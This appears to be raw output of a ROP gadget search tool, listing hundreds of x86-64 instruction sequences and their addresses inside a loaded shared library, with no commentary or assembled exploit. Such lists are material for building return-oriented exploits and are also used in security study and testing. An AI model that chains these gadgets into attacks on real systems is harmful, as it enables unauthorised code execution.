0x00002aaaaabc531f : and eax, 0x85ffffff ; fisttp dword ptr [rdi] ; xchg eax, ebp ; ret
0x00002aaaaab559a3 : and eax, 0x950f4100 ; ret
0x00002aaaaabe9567 : and eax, 0xc ; cmp eax, 4 ; je 0x114578 ; ret
0x00002aaaaabe9738 : and eax, 0xc ; pop rbp ; pop r12 ; ret
0x00002aaaaab42360 : and eax, 0xe889fffb ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabca877 : and eax, 0xe8fffffd ; xor byte ptr [rsi - 3], ch ; dec dword ptr [rax - 0x39] ; ret 0xffff
0x00002aaaaab7f0dc : and eax, 0xf ; movsxd rsi, dword ptr [rcx + rax*4] ; add rcx, rsi ; jmp rcx
0x00002aaaaac489c5 : and eax, 0xff834800 ; add dword ptr [rdi + 3], esi ; ret
0x00002aaaaabdb961 : and eax, 0xfff ; or eax, edi ; ret
0x00002aaaaabd0cac : and eax, 0xfffffecf ; or eax, 0x30 ; mov dword ptr [rdi + 8], eax ; ret
0x00002aaaaabed82d : and eax, 0xffffff ; or eax, edi ; bswap eax ; ret
0x00002aaaaabed7c8 : and eax, 0xffffff ; ret
0x00002aaaaabf7433 : and eax, 0xfffffff8 ; add eax, 0x10 ; ret
0x00002aaaaabd626f : and eax, 1 ; jmp 0x10123b
0x00002aaaaabab708 : and eax, 1 ; pop rbx ; ret
0x00002aaaaab02ed2 : and eax, 1 ; ret
0x00002aaaaabab608 : and eax, 2 ; add eax, 8 ; ret
0x00002aaaaab02d52 : and eax, 2 ; movzx eax, ax ; ret
0x00002aaaaabab654 : and eax, 2 ; ret
0x00002aaaaac0b89b : and eax, 2 ; sub eax, 1 ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaab1d46c : and eax, 2 ; sub eax, 1 ; ret
0x00002aaaaab02df2 : and eax, 4 ; movzx eax, ax ; ret
0x00002aaaaab02d12 : and eax, 8 ; movzx eax, ax ; ret
0x00002aaaaab09e74 : and eax, 8 ; ret
0x00002aaaaac122a2 : and eax, dword ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaabeaab9 : and eax, dword ptr [rax] ; add byte ptr [rax], al ; add rsp, 0xd8 ; ret
0x00002aaaaabade1a : and eax, dword ptr [rbx - 0x7cb7fe3f] ; ret
0x00002aaaaac822f5 : and eax, dword ptr [rcx] ; add byte ptr [rax], ch ; wait ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac822dd : and eax, dword ptr [rcx] ; add byte ptr [rax], dl ; wait ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac3d009 : and eax, dword ptr [rdx] ; add byte ptr [rax], al ; ret
0x00002aaaaab0b558 : and eax, dword ptr [rdx] ; mov qword ptr [rdi], rax ; xor eax, eax ; ret
0x00002aaaaaad7d17 : and eax, ebp ; clc ; ret
0x00002aaaaac6e8a9 : and eax, edi ; jmp rsp
0x00002aaaaab09852 : and eax, edx ; movq xmm0, rax ; ret
0x00002aaaaab098bb : and eax, edx ; movq xmm1, rax ; movsd qword ptr [rdi], xmm1 ; ret
0x00002aaaaab09792 : and eax, edx ; ret
0x00002aaaaab097e0 : and eax, edx ; sub rax, rdx ; shr rax, 0x3f ; ret
0x00002aaaaab030ed : and eax, esi ; ret
0x00002aaaaac6e8a8 : and eax, r15d ; jmp rsp
0x00002aaaaab47cc0 : and ebp, edi ; pop rbx ; ret
0x00002aaaaac6d331 : and ebp, esi ; jmp rsp
0x00002aaaaabe9502 : and ebx, 0xffffffbb ; cmp r11d, 0xa ; je 0x114515 ; ret
0x00002aaaaabab74f : and ebx, 8 ; je 0xd66f0 ; pop rbx ; ret
0x00002aaaaab45cfc : and ebx, dword ptr [rbx + 0x5d] ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaac5627d : and ebx, ebp ; push qword ptr [rdi + 0x7bffeb21] ; and ch, bl ; call rdx
0x00002aaaaab0ffb8 : and ecx, 0x3ff ; xor eax, ecx ; ret
0x00002aaaaac43e75 : and ecx, 0xff ; sub eax, ecx ; ret
0x00002aaaaac435a8 : and ecx, 0xffff ; sub eax, ecx ; ret
0x00002aaaaab4a8c0 : and ecx, 0xffffffcf ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaab68d3a : and ecx, 7 ; movsxd rcx, dword ptr [rax + rcx*4] ; add rax, rcx ; jmp rax
0x00002aaaaab54d5b : and ecx, dword ptr [rax + 0x39] ; ret
0x00002aaaaabc4c3b : and ecx, dword ptr [rax - 0x75] ; je 0xefc6c ; cmp byte ptr [rax - 0x77], cl ; ret 0x8b44
0x00002aaaaac0109e : and ecx, dword ptr [rax - 0x75] ; sbb ecx, dword ptr [rax - 0x7d] ; ret
0x00002aaaaab5a7ac : and ecx, dword ptr [rcx - 0x7d] ; ret 0xeb5b
0x00002aaaaabd4be5 : and ecx, dword ptr [rdi] ; mov cl, 0x35 ; ret
0x00002aaaaab51c4c : and ecx, dword ptr [rdi] ; mov dh, 0 ; ret
0x00002aaaaabfbc56 : and ecx, dword ptr [rdi] ; xchg eax, ebp ; ret 0x2c3c
0x00002aaaaabd3d79 : and ecx, dword ptr [rdi] ; xchg eax, ebp ; ret 0x2f3c
0x00002aaaaabd3dd2 : and ecx, dword ptr [rdi] ; xchg eax, ebp ; ret 0xc084
0x00002aaaaabfbc7d : and ecx, dword ptr [rdi] ; xchg eax, ebp ; ret 0xf980
0x00002aaaaab0b46e : and ecx, dword ptr [rdx + rax*8] ; mov qword ptr [rdi + rax*8], rcx ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabdf1b3 : and ecx, dword ptr [rsi + 0x10] ; lea rcx, qword ptr [rsi + rcx*4] ; add eax, dword ptr [rcx + rdx] ; ret
0x00002aaaaab02f32 : and edi, 0xffffff80 ; sete al ; ret
0x00002aaaaac0474b : and edx, 0x7f ; movzx eax, byte ptr [rax + rdx] ; mov byte ptr [rdi + 7], al ; ret
0x00002aaaaab0fcad : and edx, 0x7fffffff ; mov dword ptr [r8], edx ; mov dword ptr [rsi], edx ; ret
0x00002aaaaab09b89 : and edx, 0x7fffffff ; sub eax, edx ; shr eax, 0x1f ; ret
0x00002aaaaab7f0a4 : and edx, 0xf ; movsxd rsi, dword ptr [rax + rdx*4] ; add rax, rsi ; jmp rax
0x00002aaaaab0ae05 : and edx, 1 ; mov dword ptr [rbx + 8], edx ; add rsp, 0x40 ; pop rbx ; ret
0x00002aaaaab4a9b3 : and edx, 1 ; mov eax, edx ; ret
0x00002aaaaaad7bf9 : and edx, esp ; bswap ebx ; clc ; ret
0x00002aaaaab1f1ee : and esi, 0xe0837fff ; jg 0x4a207 ; ret 0x5488
0x00002aaaaab02a61 : and esi, dword ptr [rdi + 0x10] ; lea rax, qword ptr [rdi + rsi*4] ; mov eax, dword ptr [rax + rdx] ; ret
0x00002aaaaabdef8f : and esi, dword ptr [rdx + 0x10] ; lea rdx, qword ptr [rdx + rsi*4] ; add eax, dword ptr [rdx + rcx] ; ret
0x00002aaaaac7f489 : and esi, edx ; jmp qword ptr [rcx]
0x00002aaaaac86d61 : and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaab41a99 : and esp, dword ptr [rcx + 0x63480011] ; xor al, 0xb7 ; add rdi, rsi ; jmp rdi
0x00002aaaaabef0e1 : and esp, dword ptr [rdi - 0x76b7ffd6] ; ror dword ptr [rdi], -0x7b ; ret 0xfffe
0x00002aaaaac69b05 : and esp, edi ; inc eax ; and bh, ah ; call qword ptr [rax]
0x00002aaaaabb270d : and esp, esi ; dec dword ptr [rcx - 0x77] ; ret 0x8949
0x00002aaaaab0af65 : and qword ptr [rdi + rdx*8], rax ; xor eax, eax ; ret
0x00002aaaaab0b0c7 : and qword ptr [rdi], rax ; xor eax, eax ; ret
0x00002aaaaab7b136 : and r11b, r8b ; nop dword ptr [rax] ; ret
0x00002aaaaabe9501 : and r11d, 0xffffffbb ; cmp r11d, 0xa ; je 0x114516 ; ret
0x00002aaaaab58572 : and r14b, byte ptr [rax + r8] ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaab0b557 : and rax, qword ptr [rdx] ; mov qword ptr [rdi], rax ; xor eax, eax ; ret
0x00002aaaaab09851 : and rax, rdx ; movq xmm0, rax ; ret
0x00002aaaaab097df : and rax, rdx ; sub rax, rdx ; shr rax, 0x3f ; ret
0x00002aaaaab0b46d : and rcx, qword ptr [rdx + rax*8] ; mov qword ptr [rdi + rax*8], rcx ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab09bcb : andnps xmm3, xmm1 ; orps xmm0, xmm3 ; ret
0x00002aaaaab09bc8 : andps xmm0, xmm3 ; andnps xmm3, xmm1 ; orps xmm0, xmm3 ; ret
0x00002aaaaab097f9 : andps xmm1, xmmword ptr [rip + 0x15ef10] ; orpd xmm0, xmm1 ; ret
0x00002aaaaab6a9fa : bsf eax, eax ; add rax, rdi ; add rax, rcx ; ret
0x00002aaaaab62f80 : bsf eax, eax ; add rax, rdi ; ret
0x00002aaaaab62f90 : bsf eax, eax ; lea rax, qword ptr [rax + rdi + 0x10] ; ret
0x00002aaaaab62fa0 : bsf eax, eax ; lea rax, qword ptr [rax + rdi + 0x20] ; ret
0x00002aaaaab62f70 : bsf eax, eax ; lea rax, qword ptr [rax + rdi - 0x10] ; ret
0x00002aaaaab62ebf : bsf eax, eax ; lea rax, qword ptr [rdi + rax + 0x30] ; ret
0x00002aaaaab6abf3 : bsf eax, eax ; lea rax, qword ptr [rdi + rax] ; ret
0x00002aaaaab62fb0 : bsf eax, eax ; sub rdx, rax ; jbe 0x8dffb ; add rax, rdi ; ret
0x00002aaaaab63c75 : bsf eax, edi ; cmove eax, edx ; add eax, 1 ; ret
0x00002aaaaab63c86 : bsf eax, edi ; cmove rax, rdx ; add eax, 1 ; ret
0x00002aaaaab5fba6 : bsf eax, edx ; ret
0x00002aaaaab5fd02 : bsf edx, edx ; add rax, rdx ; sub rax, rdi ; ret
0x00002aaaaab6ad10 : bsf rax, rax ; lea rax, qword ptr [rdi + rax] ; ret
0x00002aaaaab63c85 : bsf rax, rdi ; cmove rax, rdx ; add eax, 1 ; ret
0x00002aaaaab5fbf2 : bsf rax, rdx ; ret
0x00002aaaaab5fd01 : bsf rdx, rdx ; add rax, rdx ; sub rax, rdi ; ret
0x00002aaaaab73661 : bsr eax, eax ; add rax, rdi ; add rax, r8 ; ret
0x00002aaaaab618a7 : bsr eax, eax ; add rax, rdi ; ret
0x00002aaaaab73530 : bsr eax, eax ; lea rax, qword ptr [rax + rdi + 0x10] ; ret
0x00002aaaaab73540 : bsr eax, eax ; lea rax, qword ptr [rax + rdi + 0x20] ; ret
0x00002aaaaab73550 : bsr eax, eax ; lea rax, qword ptr [rax + rdi + 0x30] ; ret
0x00002aaaaab61b2b : bsr eax, esi ; add rax, rdi ; ret
0x00002aaaaab61a39 : bsr esi, esi ; lea rax, qword ptr [rcx + rsi] ; ret
0x00002aaaaab61935 : bsr esi, esi ; lea rax, qword ptr [rdi + rsi] ; ret
0x00002aaaaab618a6 : bsr rax, rax ; add rax, rdi ; ret
0x00002aaaaab61b2a : bsr rax, rsi ; add rax, rdi ; ret
0x00002aaaaab61a38 : bsr rsi, rsi ; lea rax, qword ptr [rcx + rsi] ; ret
0x00002aaaaab61934 : bsr rsi, rsi ; lea rax, qword ptr [rdi + rsi] ; ret
0x00002aaaaac107f1 : bswap eax ; mov dword ptr [rbx], eax ; add rsp, 0x10 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaac09516 : bswap eax ; mov dword ptr [rcx + 0x48], eax ; mov eax, 1 ; ret
0x00002aaaaac09473 : bswap eax ; mov dword ptr [rcx + 0x54], eax ; mov eax, 1 ; ret
0x00002aaaaac09543 : bswap eax ; mov dword ptr [rcx + 0x58], eax ; mov eax, 1 ; ret
0x00002aaaaac09dea : bswap eax ; mov dword ptr [rdx + 0x10], eax ; mov eax, 1 ; ret
0x00002aaaaac09cca : bswap eax ; mov dword ptr [rdx + 0xc], eax ; mov eax, 1 ; ret
0x00002aaaaac09dad : bswap eax ; mov dword ptr [rdx], eax ; mov eax, 1 ; ret
0x00002aaaaabed7a2 : bswap eax ; ret
0x00002aaaaaad7bfb : bswap ebx ; clc ; ret
0x00002aaaaabed840 : bswap edi ; test edi, edi ; js 0x11885b ; mov eax, edi ; shr eax, 0x18 ; ret
0x00002aaaaabab73a : bt eax, ecx ; jb 0xd66c0 ; pop rbx ; ret
0x00002aaaaabab739 : bt r8, rcx ; jb 0xd66c1 ; pop rbx ; ret
0x00002aaaaab39055 : call 0x11064057
0x00002aaaaab39582 : call 0x11064584
0x00002aaaaab39d3c : call 0x11064d3e
0x00002aaaaab3a126 : call 0x11065128
0x00002aaaaab3bb8b : call 0x11066b8d
0x00002aaaaab3e03b : call 0x1106903d
0x00002aaaaab3f04f : call 0x1106a051
0x00002aaaaac70068 : call 0x111998c8
0x00002aaaaac7bb88 : call 0x111a6869
0x00002aaaaab5d26e : call 0x114492
0x00002aaaaac78a18 : call 0x121a279f
0x00002aaaaac0743e : call 0x12e712
0x00002aaaaac71d88 : call 0x1319b6e1
0x00002aaaaac73198 : call 0x1319cb64
0x00002aaaaac0034c : call 0x137642
0x00002aaaaab0af40 : call 0x140ca753
0x00002aaaaabf4a06 : call 0x143ef7
0x00002aaaaac71e38 : call 0x1819b797
0x00002aaaaaafd3a9 : call 0x1c506f9
0x00002aaaaac08535 : call 0x1f7e2
0x00002aaaaabc850f : call 0x1f7f2
0x00002aaaaabc850e : call 0x1f7f3
0x00002aaaaaaf8659 : call 0x1f8a2
0x00002aaaaab9d383 : call 0x1f8a9
0x00002aaaaabc85d3 : call 0x1f8aa
0x00002aaaaab096c0 : call 0x1f8ae
0x00002aaaaabb4d9b : call 0x1f8b0
0x00002aaaaab225bc : call 0x2104d5be
0x00002aaaaab22beb : call 0x2104dbed
0x00002aaaaab22c99 : call 0x2104dc9b
0x00002aaaaab230e1 : call 0x2104e0e3
0x00002aaaaab230f0 : call 0x2104e0f2
0x00002aaaaab249b4 : call 0x2104f9b6
0x00002aaaaab24b2c : call 0x2104fb2e
0x00002aaaaac7f488 : call 0x221a96b3
0x00002aaaaac84bd8 : call 0x221af14c
0x00002aaaaac85598 : call 0x221afb1a
0x00002aaaaac84118 : call 0x241ae648
0x00002aaaaab68c04 : call 0x247dc75d
0x00002aaaaab68c04 : call 0x247dc760
0x00002aaaaac7c158 : call 0x281a6b89
0x00002aaaaaaf6958 : call 0x2dc42
0x00002aaaaab13d01 : call 0x2dc48
0x00002aaaaaafb68b : call 0x2dc49
0x00002aaaaac073b1 : call 0x2e622
0x00002aaaaaad7d71 : call 0x306b3dc4
0x00002aaaaabe12da : call 0x356f7
0x00002aaaaab9249f : call 0x39772
0x00002aaaaabc40f8 : call 0x3b3c2
0x00002aaaaab34abe : call 0x3bd42
0x00002aaaaab12fe6 : call 0x3c0a6
0x00002aaaaabb0184 : call 0x42d03acd
0x00002aaaaabb02fc : call 0x42d03c45
0x00002aaaaabb01d4 : call 0x43d03b1d
0x00002aaaaabb034c : call 0x43d03c95
0x00002aaaaaba6504 : call 0x480d2110
0x00002aaaaab84a13 : call 0x4ccd8f2a
0x00002aaaaab871db : call 0x4ccdb5f2
0x00002aaaaab89ebb : call 0x4ccde3d2
0x00002aaaaab4ba44 : call 0x4d177
0x00002aaaaac2f2fa : call 0x4f94b2f8
0x00002aaaaac2f2f9 : call 0x4f94b2f9
0x00002aaaaac31dca : call 0x4f94ddc8
0x00002aaaaac31dc9 : call 0x4f94ddc9
0x00002aaaaac348ea : call 0x4f9508e8
0x00002aaaaac348e9 : call 0x4f9508e9
0x00002aaaaaaf5ffb : call 0x53ec1009
0x00002aaaaabfe5f3 : call 0x558b2
0x00002aaaaabb89f9 : call 0x66d0c309
0x00002aaaaabb8f57 : call 0x66d0c867
0x00002aaaaabb90b9 : call 0x66d0c9c9
0x00002aaaaac6ab8a : call 0x71d897
0x00002aaaaab3ad5f : call 0x71fd2
0x00002aaaaabec18e : call 0x73442
0x00002aaaaaba1ddd : call 0x750ccee6
0x00002aaaaabd2692 : call 0x76598
0x00002aaaaab20517 : call 0x777f2
0x00002aaaaab34111 : call 0x7b3a2
0x00002aaaaab5af01 : call 0x82182
0x00002aaaaab91e7d : call 0x89162
0x00002aaaaab738d3 : call 0x8ab72
0x00002aaaaab23a7c : call 0x8ad12
0x00002aaaaabb9430 : call 0x8e694
0x00002aaaaab8e6eb : call 0x8e806
0x00002aaaaabb28c4 : call 0x938c6
0x00002aaaaabf3899 : call 0x95bb8
0x00002aaaaaaf52f6 : call 0xa9eb6
0x00002aaaaaaf53fa : call 0xa9fd6
0x00002aaaaabca84e : call 0xcc697
0x00002aaaaabca87b : call 0xcc6b7
0x00002aaaaabc8457 : call 0xef752
0x00002aaaaabdbdfd : call 0xf106e06
0x00002aaaaabdbe1d : call 0xf106e26
0x00002aaaaabd44b3 : call 0xf17d541
0x00002aaaaabd504a : call 0xf17e0d8
0x00002aaaaab3fa57 : call 0xf6d02
0x00002aaaaabf28d9 : call 0xf6d06
0x00002aaaaabd51ca : call 0xfc3e2
0x00002aaaaac009c4 : call 0xfc828
0x00002aaaaab903e2 : call 0xfcdec09
0x00002aaaaabd3859 : call 0xfe678
0x00002aaaaab0a08d : call 0xffffffff816a131d
0x00002aaaaabf2fb9 : call 0xffffffff835adfc4
0x00002aaaaabf74f7 : call 0xffffffff895be787
0x00002aaaaab8ff19 : call 0xffffffff89cdd840
0x00002aaaaab9008a : call 0xffffffff89cdd9b1
0x00002aaaaab90283 : call 0xffffffff89cddbaa
0x00002aaaaac579c3 : call 0xffffffffaedac839
0x00002aaaaab09ef6 : call 0xffffffffbad35824
0x00002aaaaab8f8ba : call 0xffffffffc234f102
0x00002aaaaab26feb : call 0xffffffffc23e67f5
0x00002aaaaab569fb : call 0xffffffffc241620c
0x00002aaaaac02db5 : call 0xffffffffc2879e43
0x00002aaaaab1c641 : call 0xffffffffc28db769
0x00002aaaaab571e8 : call 0xffffffffc2916a01
0x00002aaaaaba250c : call 0xffffffffc295d517
0x00002aaaaabc516b : call 0xffffffffc2984975
0x00002aaaaabe3abf : call 0xffffffffc29a36c9
0x00002aaaaabf7a9e : call 0xffffffffc29b311a
0x00002aaaaac04654 : call 0xffffffffc29c3e65
0x00002aaaaabaa8cd : call 0xffffffffc2e1683c
0x00002aaaaab7aa94 : call 0xffffffffc30a5aa4
0x00002aaaaab7ec86 : call 0xffffffffc30f29dc
0x00002aaaaab7ec9f : call 0xffffffffc30f29f5
0x00002aaaaab1c0a0 : call 0xffffffffc33db8aa
0x00002aaaaabe2970 : call 0xffffffffc34a217a
0x00002aaaaabe2c0c : call 0xffffffffc34a2416
0x00002aaaaab815ac : call 0xffffffffc3670712
0x00002aaaaabe4588 : call 0xffffffffc39a4192
0x00002aaaaac3fdc5 : call 0xffffffffc39cbcde
0x00002aaaaac40e45 : call 0xffffffffc39ccd5e
0x00002aaaaab0c2fd : call 0xffffffffc3b2824e
0x00002aaaaab63db7 : call 0xffffffffc3d97708
0x00002aaaaab5dec7 : call 0xffffffffc4011818
0x00002aaaaab5f6c7 : call 0xffffffffc4013018
0x00002aaaaab8753c : call 0xffffffffc7446d49
0x00002aaaaab9b77d : call 0xffffffffde966787
0x00002aaaaab09f57 : call 0xffffffffe28511e7
0x00002aaaaac8d9d8 : call 0xffffffffe81b81be
0x00002aaaaab31ba9 : call 0xfffffffffa0e517b
0x00002aaaaabe2ba1 : call 0xffffffffff9623ae
0x00002aaaaac0b11e : call qword ptr [r10]
0x00002aaaaab528af : call qword ptr [r15]
0x00002aaaaac5c6b3 : call qword ptr [rax + 0x10fff229]
0x00002aaaaac69fbb : call qword ptr [rax + 0x10fffc53]
0x00002aaaaac69fb3 : call qword ptr [rax + 0x10fffc54]
0x00002aaaaac69fab : call qword ptr [rax + 0x10fffc55]
0x00002aaaaac69fa3 : call qword ptr [rax + 0x10fffc56]
0x00002aaaaac69f9b : call qword ptr [rax + 0x10fffc57]
0x00002aaaaac6a97b : call qword ptr [rax + 0x10fffc9f]
0x00002aaaaac6a973 : call qword ptr [rax + 0x10fffca0]
0x00002aaaaac6a96b : call qword ptr [rax + 0x10fffca1]
0x00002aaaaac6a963 : call qword ptr [rax + 0x10fffca2]
0x00002aaaaac6a95b : call qword ptr [rax + 0x10fffca3]
0x00002aaaaac6a993 : call qword ptr [rax + 0x10fffca4]
0x00002aaaaac6949f : call qword ptr [rax + 0x10fffda3]
0x00002aaaaac694a7 : call qword ptr [rax + 0x10fffda4]
0x00002aaaaac694af : call qword ptr [rax + 0x10fffda5]
0x00002aaaaac6962b : call qword ptr [rax + 0x20fffbe5]
0x00002aaaaac69a6b : call qword ptr [rax + 0x20fffc34]
0x00002aaaaac699cb : call qword ptr [rax + 0x20fffc35]
0x00002aaaaac69d83 : call qword ptr [rax + 0x20fffc5c]
0x00002aaaaac69b6b : call qword ptr [rax + 0x20fffc5f]
0x00002aaaaac6a26f : call qword ptr [rax + 0x20fffc84]
0x00002aaaaac6a057 : call qword ptr [rax + 0x20fffc87]
0x00002aaaaac6a767 : call qword ptr [rax + 0x20fffcab]
0x00002aaaaab48ed7 : call qword ptr [rax + 0x80]
0x00002aaaaac69b3f : call qword ptr [rax - 0x1f0003e0]
0x00002aaaaac69aeb : call qword ptr [rax - 0x1f0003e7]
0x00002aaaaac69973 : call qword ptr [rax - 0x1f00040c]
0x00002aaaaac6991f : call qword ptr [rax - 0x1f000413]
0x00002aaaaac697a7 : call qword ptr [rax - 0x1f000438]
0x00002aaaaac69753 : call qword ptr [rax - 0x1f00043f]
0x00002aaaaac6930f : call qword ptr [rax - 0x1f0004a4]
0x00002aaaaac5d96f : call qword ptr [rax - 0x1f000bae]
0x00002aaaaac5d53f : call qword ptr [rax - 0x1f000bb4]
0x00002aaaaac49c8f : call qword ptr [rax - 0x2f00148e]
0x00002aaaaab098fc : call qword ptr [rax - 0x3d]
0x00002aaaaac5c1ff : call qword ptr [rax - 0x4f000e16]
0x00002aaaaac5c1df : call qword ptr [rax - 0x4f000e17]
0x00002aaaaac5c1bf : call qword ptr [rax - 0x4f000e18]
0x00002aaaaac6949b : call qword ptr [rax - 0x6f00025e]
0x00002aaaaac699c7 : call qword ptr [rax - 0x6f0003cd]
0x00002aaaaab2ba5e : call qword ptr [rax - 0xf938bf]
0x00002aaaaac5c4b7 : call qword ptr [rax]
0x00002aaaaac4878e : call qword ptr [rbx]
0x00002aaaaac5bcfb : call qword ptr [rcx - 0x12]
0x00002aaaaac694df : call qword ptr [rcx - 0x2e00024b]
0x00002aaaaac5d4cf : call qword ptr [rcx]
0x00002aaaaac6aeab : call qword ptr [rdi + rbp*2 - 0x745c0000]
0x00002aaaaac6f1e3 : call qword ptr [rdi + rbx + 2]
0x00002aaaaab528b0 : call qword ptr [rdi]
0x00002aaaaac69c17 : call qword ptr [rdx + 0x22fffc61]
0x00002aaaaac6a143 : call qword ptr [rdx + 0x22fffc82]
0x00002aaaaac6a84b : call qword ptr [rdx + 0x22fffc9d]
0x00002aaaaac6a63b : call qword ptr [rdx + 0x22fffca9]
0x00002aaaaab5d674 : call qword ptr [rdx]
0x00002aaaaac69bb3 : call qword ptr [rsi + 0x26fffc5e]
0x00002aaaaac6a09f : call qword ptr [rsi + 0x26fffc86]
0x00002aaaaac6a597 : call qword ptr [rsi + 0x26fffcad]
0x00002aaaaaade3a8 : call qword ptr [rsi]
0x00002aaaaac5d798 : call qword ptr [rsp + rsi*8 - 1]
0x00002aaaaaaf9075 : call r12
0x00002aaaaaaf6be2 : call r14
0x00002aaaaaaf8e55 : call r15
0x00002aaaaab41b4b : call r8
0x00002aaaaabe8d6f : call r9
0x00002aaaaabf3ebc : call rax
0x00002aaaaab02a78 : call rbx
0x00002aaaaab00398 : call rcx
0x00002aaaaaaf8e56 : call rdi
0x00002aaaaab0efce : call rdx
0x00002aaaaaaf6be3 : call rsi
0x00002aaaaaaf9076 : call rsp
0x00002aaaaac03ef9 : cdq ; add byte ptr [rip - 0x76b40000], al ; ret
0x00002aaaaab01534 : cdq ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0x8b41
0x00002aaaaac30727 : cdq ; add eax, dword ptr [rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab2a9c3 : cdq ; cmpsd dword ptr [rsi], dword ptr [rdi] ; add dword ptr [rax], eax ; add rsp, 0xd8 ; ret
0x00002aaaaac82231 : cdq ; hlt ; jmp qword ptr [rcx]
0x00002aaaaab0f6a4 : cdq ; idiv rsi ; ret
0x00002aaaaac59700 : cdq ; in eax, -1 ; lahf ; mov dh, 0xc7 ; ret 0xe71f
0x00002aaaaac596fb : cdq ; mov edi, 0x99b51319 ; in eax, -1 ; lahf ; mov dh, 0xc7 ; ret 0xe71f
0x00002aaaaab461f3 : cdq ; or eax, 0xc2890000 ; jmp 0x7118f
0x00002aaaaac5d5f8 : cdq ; push rcx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaabcf963 : cdq ; ret
0x00002aaaaabfcad3 : cdq ; xor dh, dh ; dec dword ptr [rax + 0x39] ; ret
0x00002aaaaabd05fe : cdqe ; mov qword ptr [rbx + 0x48], rax ; pop rbx ; ret
0x00002aaaaabf856d : cdqe ; shr rax, 4 ; ret
0x00002aaaaab36d01 : clc ; adc byte ptr [rax - 0x77], cl ; ret 0x860f
0x00002aaaaab568d3 : clc ; add al, 0x74 ; and al, 0x89 ; ret 0xb48b
0x00002aaaaabd1f28 : clc ; add al, 0xf ; xchg eax, ebp ; ret 0xdaf7
0x00002aaaaab485a9 : clc ; add bl, byte ptr [rbx + 0x5d] ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab267ba : clc ; add byte ptr [rax + 0xf], cl ; ret 0x8948
0x00002aaaaab000ad : clc ; add byte ptr [rax], 0 ; add cl, ch ; ret 0xfffb
0x00002aaaaab40bcf : clc ; add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x00002aaaaab2c15d : clc ; add cl, byte ptr [rax + 0x29] ; ret
0x00002aaaaab80e18 : clc ; add cl, byte ptr [rax + 0x29] ; ret 0x8948
0x00002aaaaab45cae : clc ; add cl, byte ptr [rax - 0x77] ; ret
0x00002aaaaab69e33 : clc ; add dword ptr [rax - 0x77], ecx ; ret
0x00002aaaaab3fd93 : clc ; add dword ptr [rax - 0x77], ecx ; ret 0x2b76
0x00002aaaaab6def6 : clc ; add dword ptr [rbp + 0x19], ecx ; ror byte ptr [rcx - 0x7d], cl ; ret 0x8306
0x00002aaaaac0eeb1 : clc ; add dword ptr [rbp - 0x14], esi ; mov rax, qword ptr [rdi + 8] ; mov rax, qword ptr [rax] ; jmp rax
0x00002aaaaab08390 : clc ; add dword ptr [rbx - 0x7cb70030], eax ; ret
0x00002aaaaab96800 : clc ; add dword ptr [rdi], ecx ; sahf ; ret 0x1fbd
0x00002aaaaab7ed14 : clc ; add dword ptr [rdi], ecx ; xchg eax, esp ; ret 0xfd83
0x00002aaaaabf7435 : clc ; add eax, 0x10 ; ret
0x00002aaaaab96bb9 : clc ; add eax, 0x2907fec1 ; ret 0x8944
0x00002aaaaab6d9ae : clc ; add ecx, dword ptr [rax + 0x74023354] ; sub cl, byte ptr [rdi] ; mov dh, 0x55 ; ret
0x00002aaaaac021b1 : clc ; add esi, dword ptr [rsi + 0xb] ; mov eax, 2 ; ret
0x00002aaaaab73666 : clc ; add rax, r8 ; ret
0x00002aaaaab62d48 : clc ; add rax, rcx ; ret
0x00002aaaaab52572 : clc ; add rsp, 8 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaabea882 : clc ; add rsp, 8 ; ret
0x00002aaaaac87018 : clc ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaab02f21 : clc ; and eax, 0x7f ; ret
0x00002aaaaabed7c7 : clc ; and eax, 0xffffff ; ret
0x00002aaaaabed7a1 : clc ; bswap eax ; ret
0x00002aaaaac8fcf2 : clc ; call qword ptr [rax]
0x00002aaaaac8f992 : clc ; call qword ptr [rbx]
0x00002aaaaac90772 : clc ; call qword ptr [rcx]
0x00002aaaaac9034a : clc ; call qword ptr [rdi]
0x00002aaaaac8f272 : clc ; call qword ptr [rdx]
0x00002aaaaac9046a : clc ; call rcx
0x00002aaaaac6e7f2 : clc ; call rsp
0x00002aaaaabf7411 : clc ; cmc ; je 0x12240d ; pop rbx ; ret
0x00002aaaaac46c37 : clc ; cmp eax, dword ptr [rsi - 8] ; jne 0x171d4a ; ret
0x00002aaaaac46c36 : clc ; cmp eax, dword ptr [rsi - 8] ; jne 0x171d4b ; ret
0x00002aaaaaad8af6 : clc ; cmp eax, ecx ; mov bl, 0xf7 ; adc bh, byte ptr [rax] ; cwde ; ret
0x00002aaaaac43e19 : clc ; cmp rcx, rax ; jne 0x16ee4b ; xor eax, eax ; ret
0x00002aaaaac43e18 : clc ; cmp rcx, rax ; jne 0x16ee4c ; xor eax, eax ; ret
0x00002aaaaac44c59 : clc ; cmp rcx, rax ; jne 0x16fc8b ; xor eax, eax ; ret
0x00002aaaaac44c58 : clc ; cmp rcx, rax ; jne 0x16fc8c ; xor eax, eax ; ret
0x00002aaaaab0f6a2 : clc ; cqo ; idiv rsi ; ret
0x00002aaaaab5bd20 : clc ; dec dword ptr [rax + 0xf] ; ret 0x8348
0x00002aaaaab4db0c : clc ; dec dword ptr [rax + 0xf] ; ret 0x8d48
0x00002aaaaabd2a03 : clc ; dec dword ptr [rax - 0x73] ; adc cl, byte ptr [rax - 0x77] ; ret 0x8948
